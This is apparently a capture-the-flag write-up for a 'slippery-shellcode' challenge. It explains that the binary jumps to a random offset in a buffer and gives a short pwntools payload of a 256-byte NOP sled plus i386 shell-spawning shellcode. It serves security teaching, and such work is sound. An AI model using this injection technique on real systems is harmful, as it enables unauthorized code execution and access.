- - - -
### Problem:
This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015 on the shell server. Source.

- - - -
### Goal:
Spawn a shell. Drom some shell code in and make sure it is run.

- - - -
### Solution:
Very similar to pwn-50-HandyShellcode. Primary difference this time is this line here:
```c
int offset = (rand() % 256) + 1;
((void (*)())(buf+offset))();
```

Since we don't know where execution will begin, we can use a classic tool - the NOP sled.

The NOP sled is a sequence of NOPS which are instructions that effectively do nothing. If we fill up the entire 256 offset with NOPS, no matter where the offset is, it will perform these empty instructions up until it reaches our shellcode.

```python
cmd = b'\x90' * 256   # NOP Sled
cmd += asm(shellcraft.i386.linux.sh())  # Shellcode
```

Note, that I used different shellcode this time. The shellcode I had used in pwn-50-HandyShellcode did not work on this binary.
